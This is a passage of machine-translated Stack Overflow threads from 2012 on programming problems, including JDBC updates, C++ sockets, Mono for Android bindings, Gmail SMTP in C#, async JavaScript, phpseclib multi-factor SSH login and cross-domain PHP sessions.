    at HentbestillingsordreHandler$1.actionPerformed(HentbestillingsordreHandler.java:120)
    at javax.swing.AbstractButton.fireActionPerformed(Unknown Source)
    at javax.swing.AbstractButton$Handler.actionPerformed(Unknown Source)
    at javax.swing.DefaultButtonModel.fireActionPerformed(Unknown Source)
    at javax.swing.DefaultButtonModel.setPressed(Unknown Source)
    at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(Unknown Source)
    at java.awt.Component.processMouseEvent(Unknown Source)
    at javax.swing.JComponent.processMouseEvent(Unknown Source)
    at java.awt.Component.processEvent(Unknown Source)
    at java.awt.Container.processEvent(Unknown Source)
    at java.awt.Component.dispatchEventImpl(Unknown Source)
    at java.awt.Container.dispatchEventImpl(Unknown Source)
    at java.awt.Component.dispatchEvent(Unknown Source)
    at java.awt.LightweightDispatcher.retargetMouseEvent(Unknown Source)
    at java.awt.LightweightDispatcher.processMouseEvent(Unknown Source)
    at java.awt.LightweightDispatcher.dispatchEvent(Unknown Source)
    at java.awt.Container.dispatchEventImpl(Unknown Source)
    at java.awt.Window.dispatchEventImpl(Unknown Source)
    at java.awt.Component.dispatchEvent(Unknown Source)
    at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
    at java.awt.EventQueue.access$000(Unknown Source)
    at java.awt.EventQueue$3.run(Unknown Source)
    at java.awt.EventQueue$3.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
    at java.awt.EventQueue$4.run(Unknown Source)
    at java.awt.EventQueue$4.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
    at java.awt.EventQueue.dispatchEvent(Unknown Source)
    at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
    at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
    at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
    at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
    at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
    at java.awt.EventDispatchThread.run(Unknown Source) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:18:03.600

这看起来不像 NPE，看起来您需要使用 executeUpdate 而不是 executeQuery。你可以试试这个：

```
...
con.createStatement();
opdatereOrdre = stmt.executeUpdate("UPDATE varebestillinger set BestillingsStatus=1, ModtagetAf ="+Modtager+" where    BestillingsID="+BestillingsID);
... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:23:42.437

使用 JDBC 执行查询主要有三种有用的方法，下面是对所有这些方法的解释，并了解在哪里使用这些方法

```
1\. boolean execute() 
```

执行此 PreparedStatement 对象中的 SQL 语句，该对象可以是任何类型的 SQL 语句。

```
2\. ResultSet executeQuery() 
```

在此 PreparedStatement 对象中执行 SQL 查询，并返回查询生成的 ResultSet 对象。

```
3 . int executeUpdate() 
```

执行此 PreparedStatement 对象中的 SQL 语句，该语句必须是 SQL INSERT、UPDATE 或 DELETE 语句；或不返回任何内容的 SQL 语句，例如 DDL 语句。

# c++ - 单连接服务器套接字

> ID：13806685
> 
> 赞同：1
> 
> 时间：2012-12-10T18:12:38.657
> 
> 标签：c++, sockets

我想使用标准（socket.h）库实现一个服务器 c++ 服务器程序（在 linux 下），该库只接受一个活动连接。我对如何实现这一点的理解是这样的（我已经删除了错误检查）：

```
int port = 4711;
int MAXCONNECTIONS = 5;

int m_sock;
m_sock = socket ( AF_INET, SOCK_STREAM,  0 );

int on = 1;
setsockopt ( m_sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof ( on ) ) < 0

sockaddr_in m_addr;
m_addr.sin_family = AF_INET;
m_addr.sin_addr.s_addr = INADDR_ANY;
m_addr.sin_port = htons ( port );

bind ( m_sock, ( struct sockaddr * ) &m_addr,
                           sizeof ( m_addr ) );

listen ( m_sock, MAXCONNECTIONS );

// now accept new connection and get socket
int con_sock;
int addr_length = sizeof ( m_addr );
con_sock = accept ( m_sock, ( sockaddr * ) &m_addr, ( socklen_t * ) &addr_length ); 
```

到目前为止，这在我的代码中有效。但创建的第一个套接字仍将接受连接。据我了解，我现在需要关闭第一个套接字。

```
close ( m_sock ); 
```

这可以防止新的连接。但是现在当第一个发生故障时，我无法重新建立任何连接。据我了解，我将不得不重复与上述相同的过程。

我遇到的是我的代码运行良好，直到接受它会阻塞并等待连接但客户端连接将收到“连接被拒绝”并且我在 netstat 中看不到任何 LISTEN 端口。

你有什么想法？

此处不考虑接受其他连接并立即关闭它们的选项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:36:31.313

只是在需要之前不要[`accept(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/accept.2.html)建立新的连接。循环接受、处理客户端对话并关闭连接的套接字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:15:26.300

首先，尝试更改第二行代码（当前`int MAXCONNECTIONS = 5;`）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:30:23.920

首先，让我们区分*监听*套接字和*连接*套接字。监听套接字是服务器监听的套接字，即等待客户端。一旦调用accept返回，就意味着与客户端的3次握手完成并且accept返回一个连接的socket。连接的套接字是与客户端进行实际通信的套接字。

在您的示例中，`m_sock`是一个侦听套接字，并且`con_sock`是连接的套接字。当您关闭“m_sock”时，实际上是在关闭侦听套接字，因此服务器无法接受更多连接，这就是客户端连接被拒绝错误的原因。

如果一次只处理一个请求是您的任务，我想您需要的是迭代服务器。您不需要关闭侦听套接字，因为只有在前一个请求完全处理后才会处理下一个请求。

```
listen ( m_sock, MAXCONNECTIONS );

// now accept new connection and get socket
int con_sock;
int addr_length = sizeof ( m_addr );
for(;;)
{
        con_sock = accept ( m_sock, ( sockaddr * ) &m_addr, ( socklen_t * ) &addr_length );
        //do your task
        close(con_sock);
} 
```

如果您想在处理一个请求时拒绝与其他连接的连接，您可能希望将 backlog 值减少到 1。但这不会向`ECONNREFUSE`客户端发送错误，而只会忽略客户端请求。但是，当服务器空闲时，即使这样，服务器队列中也只有一个连接。（不太清楚你为什么要这样做。）

# android - 将 AChartEngine 1.0.0 绑定到 Mono For Android 项目不起作用

> ID：13806686
> 
> 赞同：1
> 
> 时间：2012-12-10T18:12:43.570
> 
> 标签：android, mono, xamarin.android, achartengine

有没有人能够将 achartengine 1.0 库绑定到 MonoForAndroid 项目（rel. 4.2.7）并使其工作？

我在我的解决方案中创建了“Java Binding Library”项目，我在文件夹 Jars 中复制了文件 acahrtengine.jar，编辑了文件 Transforms/metadata.xml 添加以下行以规范命名空间并修复错误：

```
<attr path="/api/package[@name='org.achartengine']" name="managedName">AChartEngine</attr>
<attr path="/api/package[@name='org.achartengine.chart']" name="managedName">AChartEngine.Chart</attr>
<attr path="/api/package[@name='org.achartengine.model']" name="managedName">AChartEngine.Model</attr>
<attr path="/api/package[@name='org.achartengine.renderer']" name="managedName">AChartEngine.Renderer</attr>
<attr path="/api/package[@name='org.achartengine.tools']" name="managedName">AChartEngine.Tools</attr>
<attr path="/api/package[@name='org.achartengine.util']" name="managedName">AChartEngine.Util</attr>

<attr path="/api/package[@name='org.achartengine.tools']/class[@name='Pan']/method[@name='addPanListener']" name="eventName">PanEvent</attr> 
```

它没有错误地遵守并创建 DLL，但是当我将引用添加到我的项目并尝试重新编译时，出现以下错误

```
obj\Debug\android\src\mono\org\achartengine\tools\PanListenerImplementor.java(8,25): javac error :  package org.achartengine.tools does not exist
obj\Debug\android\src\mono\org\achartengine\tools\PanListenerImplementor.java(8,25): javac error :      org.achartengine.tools.PanListener
obj\Debug\android\src\mono\org\achartengine\tools\PanListenerImplementor.java(8,25): javac error : 
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(8,25): javac error :  package org.achartengine.tools does not exist
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(8,25): javac error :         org.achartengine.tools.ZoomListener
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(8,25): javac error : 
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(28,49): javac error :  package org.achartengine.tools does not exist
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(28,49): javac error :    public void zoomApplied (org.achartengine.tools.ZoomEvent p0)
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(28,49): javac error : 
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(33,59): error :  package org.achartengine.tools does not exist
obj\Debug\android\src\mono\org\achartengine\tools\ZoomListenerImplementor.java(33,59): error :  private native void n_zoomApplied (org.achartengine.tools.ZoomEvent p0); 
```

有什么建议可以让 AChartEngine 在 Mono For Android 上运行吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T21:08:47.940

您需要将 jar 文件添加到 Monodroid 项目以及引用绑定项目。

该过程在此处的帮助文档中进行了描述：

[http://docs.xamarin.com/Android/Guides/Advanced_Topics/Java_Integration_Overview/Binding_a_Java_Library_(.jar)#Add_the_Jar_to_the_Project](http://docs.xamarin.com/Android/Guides/Advanced_Topics/Java_Integration_Overview/Binding_a_Java_Library_(.jar)#Add_the_Jar_to_the_Project)

# r - 从 ESRI v10 地理数据库中获取 R 中的数据

> ID：13806687
> 
> 赞同：5
> 
> 时间：2012-12-10T18:12:47.957
> 
> 标签：r, spatial, esri

有谁知道从 R 中的 ESRI v10 文件地理数据库中获取（栅格）数据的方法？

ESRI 提供了一个[C++ API](http://resources.arcgis.com/content/geodatabases/10.0/file-gdb-api)（适用于 Linux 和 Windows），所以我想原则上 R 包应该可以检索（和写入）数据到地理数据库。我找不到任何能够做到这一点的软件包。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-06-01T18:57:41.160

显然`rgdal` [现在支持文件地理数据库读取访问](https://stat.ethz.ch/pipermail/r-sig-geo/attachments/20140710/5dda6bc4/attachment.pl)：

```
library(rgdal)
subset(ogrDrivers(), grepl("GDB", name))
ogrListLayers("/path/to/folder.gdb") 
```

在 Windows 上为我工作`R v3.2.0`，, `rgdal v0.9-3`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T19:17:15.227

一个快速的谷歌将我带到以下页面：

[http://www.gdal.org/ogr/drv_filegdb.html](http://www.gdal.org/ogr/drv_filegdb.html)

这建议`gdal`支持文件地理数据库。很可能，R 还通过正确构建的`rgdal`包支持该格式。从本质上讲，如果单机版`gdal`有支持，则`rgdal`针对它构建的包也应该读取文件地理数据库。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-06-18T16:50:08.780

GDAL 无法从文件地理数据库中读取栅格。

*   [http://erouault.blogspot.fi/2014/01/ogr-openfilegdb-driver.html](http://erouault.blogspot.fi/2014/01/ogr-openfilegdb-driver.html)
*   [https://gis.stackexchange.com/questions/62030/use-gdal-python-to-add-rasters-tiff-to-an-esri-file-geodatabase](https://gis.stackexchange.com/questions/62030/use-gdal-python-to-add-rasters-tiff-to-an-esri-file-geodatabase)
*   [使用 GDAL 处理文件地理数据库 (.gdb) 中的栅格](https://stackoverflow.com/questions/27821571/working-with-rasters-in-file-geodatabase-gdb-with-gdal)

但是，它可以读取矢量要素类。这让我确信它`rgdal`也不支持读取栅格图层。事实上，ESRI 自己的 FileGDB API 并没有光栅支持。

不幸的是，这意味着您将需要使用 ESRI 工具将栅格图层导出为可以在 R 中使用的格式。希望很快就会有用于访问 ESRI GDB 的开源解决方案。

# c# - 发送 gmail 和 live/hotmail 电子邮件

> ID：13806688
> 
> 赞同：0
> 
> 时间：2012-12-10T18:12:55.957
> 
> 标签：c#, visual-studio-2008

对于我的应用程序，我有代码可以为 live/hotmail 发送电子邮件，但不是为 gmail 发送电子邮件，这不起作用我试图为它建立一个检查，以查看用于发送电子邮件的帐户，但它不起作用，当我尝试发送 Gmail 电子邮件时。这是我用于检查的代码：

```
MailMessage msg = new MailMessage();
            msg.To.Add(txtAan.Text);
            msg.From = new MailAddress(txtGebruikersnaam.Text);
            msg.Subject = txtOnderwerp.Text;
            msg.Body = txtBericht.Text;

            string smtpcheck = txtGebruikersnaam.Text;
            smtpcheck.Substring(Math.Max(0, smtpcheck.Length - 10));

            SmtpClient smtp = new SmtpClient();
            if (smtpcheck.ToLower() == "@gmail.com")
            {
                smtp.Host = "smtp.gmail.com";
                smtp.Port = 25;
            }
            else if(smtpcheck.ToLower() != "@gmail.com")
            {
                smtp.Host = "smtp.live.com";
                smtp.Port = 587;
            }
            smtp.EnableSsl = true;
            smtp.Credentials = new NetworkCredential(txtGebruikersnaam.Text, txtWachtwoord.Text);
            smtp.Send(msg); 
```

当我尝试使用 Gmail 发送电子邮件时，此代码给我一个错误，有人可以帮我解决这个问题吗？是的，我也尝试了端口：465 和 587 用于 gmail，所以我认为这也不是问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:16:16.540

此行不会更改 smtpcheck 的值

```
 smtpcheck.Substring(Math.Max(0, smtpcheck.Length - 10)); 
```

你需要写

```
 smtpcheck = smtpcheck.Substring(Math.Max(0, smtpcheck.Length - 10)); 
```

结果，您的 if 条件失败，并且您始终使用 live.com 发送邮件

编辑：对于 gmail，此代码已确认有效

```
 SmtpClient sc = new SmtpClient("smtp.gmail.com");
 NetworkCredential nc = new NetworkCredential("username", "password");
 sc.UseDefaultCredentials = false;
 sc.Credentials = nc;
 sc.EnableSsl = true;
 sc.Port = 587; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:17:40.230

```
try
{
     MailMessage mail = new MailMessage();
     SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

     mail.From = new MailAddress("your_email_address@gmail.com");
     mail.To.Add("to_address");
     mail.Subject = "Test Mail";
     mail.Body = "This is for testing SMTP mail from GMAIL";

     SmtpServer.Port = 587;
     SmtpServer.Credentials = new System.Net.NetworkCredential("username", "password");
     SmtpServer.EnableSsl = true;

     SmtpServer.Send(mail);
     MessageBox.Show("mail Send");
}
catch (Exception ex)
{
     MessageBox.Show(ex.ToString());
} 
```

# requirejs - 使用 require.js 的多个路由器和控制器

> ID：13806693
> 
> 赞同：7
> 
> 时间：2012-12-10T18:13:05.490
> 
> 标签：requirejs, marionette

我在wiki上遇到了这个：

> 建议您将控制器对象划分为较小的相关功能块，并拥有多个路由器/控制器，而不是只有一个巨大的路由器和控制器。

我不明白如何应用这个。有没有例子或教程？

现在，我正在玩`Marionette`和使用`require.js`. 我将如何实施多个路由器和控制器？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-15T22:51:24.853

我最终在我的“main.js”中得到了这个：

```
MyApp.start();

new BlogRouter({
    controller: new BlogController()
});

new NewsRouter({
    controller: new NewsController()
});

Backbone.history.start(); 
```

我不确定这是否是正确的方法。但它正在工作。希望对像我这样的新手有所帮助。

# javascript - 什么是异步 javascript 函数的简单示例？

> ID：13806695
> 
> 赞同：19
> 
> 时间：2012-12-10T18:13:26.503
> 
> 标签：javascript, asynchronous

我在这里真的很难掌握编写异步 JavaScript。您能否提供一个简单的 JavaScript 函数示例，该函数是用纯 JavaScript 异步编写的（不使用 Node.js 或 JQuery）

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-12-10T18:20:56.707

JavaScript 本身是同步的和单线程的。你不能写异步函数；普通 JS 没有计时 API。并行线程不会有副作用。

您可以做的是使用您的环境（Node.js、Webbrowser）提供的一些 API，这些 API 允许您安排异步任务 - 使用超时、ajax、FileAPI、、、`requestAnimationFrame`WebWorkers `nextTick`、DOM 事件等等。

使用示例[`setTimeout`](https://developer.mozilla.org/en-US/docs/DOM/window.setTimeout)（由[HTML Timing API](http://www.w3.org/TR/html5/webappapis.html#timers)提供）：

```
window.setTimeout(function() {
    console.log("World");
}, 1000);
console.log("Hello"); 
```

* * *

更新：由于 ES6 有作为异步原语内置到纯 JavaScript 中的承诺，所以你可以这样做

```
 Promise.resolve("World").then(console.log); // then callbacks are always asynchronous
 console.log("Hello"); 
```

但是，当您无法等待（例如超时）时，它们本身并没有真正的帮助。而且它们也不会改变线程模型的任何内容，所有执行都是运行到完成，没有任何事件在中途干扰。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-12-10T18:18:01.657

这是异步的：

```
setTimeout(function(){
   console.log('1');
}, 2000);

console.log('2'); 
```

2 会在 1 之前写入控制台。因为 setTimeout 是异步的。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-12-10T18:18:02.827

这是一个非常简单的例子：

```
for (var i = 0; i < 10; i++) {
  window.setTimeout(function() {
    console.log(i);
  }, 2000);
} 
```

您可能希望这些`console.log()`调用向您显示`0, 1, 2`等，如以下代码段所示：

```
for (var i = 0; i < 10; i++) {
  console.log(i);
} 
```

但实际上只有`10`s 会被打印出来！传递给`setTimeout`函数的函数（作为它的“回调”参数）将在循环完成*后* `for`调用的原因 - 即，在`i`值设置为 10 之后。

然而你应该明白一件事：浏览器中的所有 JavaScript 都在一个线程上执行；异步事件（例如鼠标点击和计时器）仅在执行队列中有空位时运行。这是John Resig 写的一篇关于这个主题[的精彩文章。](http://ejohn.org/blog/how-javascript-timers-work/)

# php - phpseclib - 我可以使用用户名、密钥和密码（不是密钥密码）进行连接吗

> ID：13806699
> 
> 赞同：2
> 
> 时间：2012-12-10T18:13:40.200
> 
> 标签：php, ssh, passwords, sftp, phpseclib

抱歉，如果我在文档中遗漏了这一点，但是否可以使用私钥和密码（不是我的私钥的密码）连接到 SFTP 服务器。

这些示例显示了用户名/密码、用户名/密钥和用户名/密钥/密钥密码验证类型。

通过命令行连接时，我会收到输入密码的提示...

> 用户@xxxx 的密码：

希望这个库可以处理这个？

否则是否有任何其他基于 PHP 的解决方案可能支持用户名/密钥和服务器密码身份验证？我在这里很灵活，可以根据需要安装模块。

**编辑**

到目前为止，感谢您的帮助...我已经尝试过您提到的 Neubert 但这似乎不起作用。为了验证连接到服务器所需的内容，我在命令行上对此进行了测试。
`sftp key user@ip`- 按预期
`sftp user@ip`提示输入密码 - 提示输入密码，但输入正确时告诉我“已通过部分成功验证”。

如果我可以使用密钥然后密码进入，我认为目录和密钥的权限应该没问题。

我开始认为这个库不支持我需要的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T21:17:36.020

phpseclib[支持多因素身份验证](http://phpseclib.sourceforge.net/ssh/auth.html#multifactor)。以下是如何执行此操作的示例：

```
<?php
include('Net/SSH2.php');
include('Crypt/RSA.php')

$rsa = new Crypt_RSA();
$rsa->loadKey(file_get_contents('/path/to/key.pem'));

$ssh = new Net_SSH2('www.domain.tld');
if (!$ssh->login('username', 'pass1', $rsa)) {
    exit('Login failed');
}
// this does the same thing as the above
//if (!$ssh->login($username, 'pass1') && !$ssh->login('username', $rsa)) {
//    exit('Login failed');
//}

echo $ssh->exec('pwd');
echo $ssh->exec('ls -la');
?> 
```

但是要记住一点：很多人将受密码保护的私钥混淆为多因素（密码和公钥），而实际上并非如此。至少就 SSH 而言不是这样。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-06T22:08:43.423

*@MartinPrikryl 的免责声明：此解决方案已过时，因为[phpseclib 本身支持多因素身份验证](http://phpseclib.sourceforge.net/ssh/auth.html#multifactor)- 另请参阅[@BoukeVersteegh](https://stackoverflow.com/a/40765213/850848)和[@neubert](https://stackoverflow.com/a/13809423/850848)的答案。*

* * *

我在使用 phpseclib 的一个项目中遇到了同样的问题。我尝试了几个建议都无济于事，最后自己对库代码进行了一些研究。我最终修改了它，虽然不是很多。

在SSH2.php私有方法'_privatekey_login'（有key时从login方法调用）中，方法末尾有处理认证失败的代码。

```
extract(unpack('Ctype', $this->_string_shift($response, 1)));

switch ($type) {
   case NET_SSH2_MSG_USERAUTH_FAILURE:
      // either the login is bad or the server employs multi-factor authentication
      return false;
   case NET_SSH2_MSG_USERAUTH_SUCCESS:
      $this->bitmap |= NET_SSH2_MASK_LOGIN;
      return true;
} 
```

输入一些日志后，我发现我从服务器返回的响应确实是“密码，键盘交互”。

我修改了所有登录方法（在 SFTP 和 SSH2 类中）以获取第二个密码，并将其一直传递给“_privatekey_login”方法。然后我将上面的部分更改为以下内容：

```
extract(unpack('Ctype', $this->_string_shift($response, 1)));

switch ($type) {
   case NET_SSH2_MSG_USERAUTH_FAILURE:
      // Possible multi-factor authentication.
      if ($password && $this->_keyboard_interactive_login($username, $password)) {
         $this->bitmap |= NET_SSH2_MASK_LOGIN;
         return true;
      }
      // the login is bad.
      return false;
   case NET_SSH2_MSG_USERAUTH_SUCCESS:
      $this->bitmap |= NET_SSH2_MASK_LOGIN;
      return true;
} 
```

我从代码的另一部分复制了键盘交互调用，因此其中一些可能不是完全必要的。虽然它可能不适用于所有服务器，但在我的情况下它工作得很好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-11-23T12:58:30.190

简短的简单回答：首先使用用户+密钥登录，然后使用用户+密码登录。

```
$host = 'ftp.example.com';
$username = 'username';
$password = 'secret';
$key = new RSA();
$key->load(file_get_contents('~/.ssh/private_key.pem'));

$sftp = new SFTP($host);

if ($sftp->login($username, $key) || $sftp->login($username, $secret)) {
    // success
} else {
    // failed
} 
```

是的，这已经被提到了，但是长的注释使它变得晦涩难懂并且看起来很复杂。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T19:18:42.123

我决定删除我的另一个答案，因为事实证明我错了；您**可以**使用 SSH 进行多因素登录，但不是以标准方式。这些身份验证方法都不是原生的或内置于 openssh 的，因此没有标准的方法来解决它。大多数使用 Google Authenticator 提供一次性密码，但也有区别。根据[该站点](https://moocode.com/posts/5-simple-two-factor-ssh-authentication-with-google-authenticator)的建议，看起来它是通过在用户通过 SSH 服务器身份验证之后调用命令来完成的。查看方法中的源`phpseclib`代码，它具有以下代码：`Net/SSH2.php``login()`

```
case NET_SSH2_MSG_USERAUTH_FAILURE:
    // can we use keyboard-interactive authentication?  if not then either the login is bad or the server employees
    // multi-factor authentication
    [...]
    return false; 
```

甚至 phpseclib 开发人员也意识到多因素身份验证是可能的，但由于缺乏标准，他们没有费心编写它。谷歌搜索你的错误代码

> 部分成功认证

表明这是您尝试连接的服务器的设置方式。如果您想编写特定于服务器设置的多因素身份验证，我不明白为什么这是不可能的。这是您需要编辑才能执行此操作的文件。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-12-10T18:17:41.157

您可以[在 PECL 中使用 SSH2 绑定](http://pecl.php.net/package/ssh2)。它支持您提到的所有身份验证机制并且运行良好。

# php - 安全灵活的跨域会话

> ID：13806701
> 
> 赞同：6
> 
> 时间：2012-12-10T18:13:50.077
> 
> 标签：php, session, cross-domain, security

我遇到了一个问题，希望您能帮助解决。假设我在一家名为“Blammo”的假设公司工作，我们有一个名为“Log”的假设产品。我正在尝试建立一个系统，有人可以登录到 logfromblammo.com 并订购我们的一些产品，然后当他们准备购买时，去 checkout.blammo.com 支付他们的订单。最终我想让 Blammo 推出一个新的假设产品，它有自己的网站：rockfromblammo.com，并让该网站也能够与 checkout.blammo.com 共享会话，这样用户就可以在这两种产品中拥有一个购物车网站。

当然，上面描述的假设场景并不是我公司的实际运作方式，但它是我需要做的一个很好的例子。我们有一个现有的用户数据库，我们有办法在我们的任何站点上验证我们的任何用户，但我的目标是允许用户从一个站点无缝地跨越到另一个站点，而无需重新验证。这也将允许我们将购物车等数据无缝传输到结帐站点。

我（简要地）查看了 OpenID 等解决方案，但我需要能够将我们拥有的任何解决方案与我们现有的身份验证方法集成在一起，这并不是非常强大。有没有什么好方法可以单独通过 PHP 做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T18:37:39.900

您可以做的是在站点之间创建“交叉”链接以进行会话。

最简单的方法是通过查询字符串传递会话 ID；例如

```
http://whateverblammo.com/?sessid=XXYYZZ 
```

在您开始认为任何人都可以捕获该信息之前，请考虑您的 cookie 是如何传输的；假设您没有使用 SSL，那么对于使用网络的人来说并没有太大区别。

这并不意味着它是安全的。一方面，用户可能会不小心复制/粘贴地址栏，从而泄露他们的会话。为了限制这种暴露，您可以在收到页面后立即重定向到没有会话 ID 的页面。

请注意，`mcrypt()`在会话 ID 上使用不会有太大帮助，因为问题不是值的可见性；会话劫持不关心底层价值，只关心它的 url 的可重复性。

您必须确保该 id 只能使用一次；这可以通过创建一个跟踪使用计数的会话变量来完成：

```
$_SESSION['extids'] = array();

$ext = md5(uniqid(mt_rand(), true)); // just a semi random diddy
$_SESSION['extids'][$ext] = 1;

$link = 'http://othersite/?' . http_build_query('sessid' => session_id() . '-' . $ext); 
```

收到时：

```
list($sid, $ext) = explode('-', $_GET['sessid']);
session_id($sid);
session_start();
if (isset($_SESSION['extids'][$ext])) {
    // okay, make sure it can't be used again
    unset($_SESSION['extids'][$ext]);
} 
```

**每次**跨越边界时都需要这些链接，因为会话可能自上次以来已重新生成。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-10T18:38:54.153

可以做到，但**不能**使用简单的 cookie，而且这不是微不足道的。您所追求的是单点登录 (SSO) 解决方案，类似于 Google 在 i.google.com、gmail.com、youtube.com 等上共享登录的解决方案。

我过去曾使用 OpenID 来实现这一点。

基本思想是拥有一个单一的身份验证域（提供者），每当其中一个站点（消费者）想要对用户进行身份验证时，它们会将它们重定向到身份验证域。如果他们没有登录，他们可以使用您需要的任何详细信息登录。

如果他们已经登录（即使从不同的目标站点），他们不需要再次登录。

然后，用户会被发送回目标站点，并在 url 中添加一个令牌。目标站点的服务器使用此令牌来验证用户是否已通过身份验证服务器进行身份验证。

这是一个非常简单的解释。做到这一点并不困难，**安全地**做到这一点更是如此。安全地生成和验证令牌的细节是具有挑战性的部分。这就是为什么我建议构建一个设计良好的系统，比如 OpenID。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-12-27T14:02:19.653

在跨域 Ajax 中，您可能会发现跨域请求丢失了 cookie 以及随后的会话。如果您要从站点**example.com**向子域**s2.example.com**进行 ajax 调用，您将需要在 PHP 的标头中使用属性：

```
header('Access-Control-Allow-Origin: https://example.com');
header('Access-Control-Allow-Credentials: true'); 
```

在JS中你要添加

```
xhrFields: { withCredentials: true } 
```

否则 cookie 不会通过，您将无法在子域上使用会话。

对子域的完整 JS 请求将不会**丢失会话**：

```
$.ajax({
    url: "https://s2.example.com/api.php?foo=1&bar=2",
    xhrFields: { withCredentials: true },
    success:function(e){
        jsn=$.parseJSON(e);
        if(jsn.status=="success") { 
                alert('OK!');
        } else {
                alert('Error!');
        }
    }
}) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-10T18:21:19.513

您需要像这样设置会话 cookie 域：

```
session_set_cookie_params($lifetime,$path,'.site.com') 
```

**这仅适用于站点位于相同域名（包括`TLD`（顶级域））上的情况。**

请参阅[此处](http://php.net/manual/en/function.session-set-cookie-params.php)了解更多信息

或者，如果您正在考虑尝试跨域访问会话，例如 from `site1.net`to `site2.com`，则无法做到这一点。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-10T18:46:37.367

如果您的网站可以依赖 Javascript 来运行，那么您大概可以执行以下操作：

假设您在 blammo.com 上有一个会话，并且您想从 rockblammo.com 访问它。在 rockblammo.com 页面上，您可以加载`<script>`from `blammo.com/get-session.js`，这将（从服务器端）返回会话 ID。一旦返回，您`<script>`在页面中插入一个新标签，指向`rockblammo.com/set-session.js?sessionId=XXX`，其中 XXX 是您刚刚从 blammo.com 获得的会话 ID。现在，在rockblammo.com 的服务器端，会话cookie 被更新并设置为这个会话ID。展望未来，这两个页面现在将共享相同的 session-id，并且假设它们可以访问后端的相同会话存储，它们将是同步的。

例如，输出`blammo.com/get-session.js`将是：

```
var sessionId = "XXX";
var s = document.createElement("script");
s.src = "/set-session.js?sessionId=" + escape(sessionId);
document.body.appendChild(s); 
```

的输出`rockblammo.com/set-session.js`将为空白，但将包含一个 http 标头，例如：

```
Set-Cookie: sessionId=XXX 
```

如果您不想依赖 Javascript，您可以通过在两个站点之间来回重定向并在查询字符串参数（GET 参数）中传递 sessionId 来做同样的事情。

# python - 格式化数字时钟的时间

> ID：13806708
> 
> 赞同：1
> 
> 时间：2012-12-10T18:14:05.583
> 
> 标签：python, time, clock

我正在创建一个函数，它接收十分之一秒 (t) 并返回一个处理过的字符串（类似数字时钟）。

有没有更好/更容易/最佳的方法来做到这一点？

输出格式：**A:BC.D**（分：秒。十分之一）

```
def format(t):
    A = 0
    B = 0
    C = 0
    D = t

    if t >= 10:
        C = t // 10
        D = t % 10

        if C >= 10:
            B = C // 10
            C = C % 10

            if B >= 6:
                A = B // 6
                B = B % 6

    return str(A) + ":" + str(B) + str(C) + "." + str(D) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:23:38.777

所有这些`ifs`都是完全不必要的，并且可以简化其他一些事情：

```
def fmt(t):
    tenths = t % 10
    t //= 10
    sec = t % 60
    t //= 60
    min = t
    return '%d:%02d.%d' % (min, sec, tenths)

print(fmt(1234)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:24:07.153

```
def format(t):
    seconds, fractions = divmod(t, 10)
    minutes, seconds = divmod(seconds, 60)
    return "%d:%02d.%d" % (minutes, seconds, fractions) 
```

示例输出：

```
>>> format(10)
'0:01.0'
>>> format(100)
'0:10.0'
>>> format(1000)
'1:40.0' 
```

# postgresql - PostgreSql -> CTE + UPDATE + DELETE -> 不是预期的结果，为什么？

> ID：13806710
> 
> 赞同：12
> 
> 时间：2012-12-10T18:14:10.367
> 
> 标签：postgresql, common-table-expression

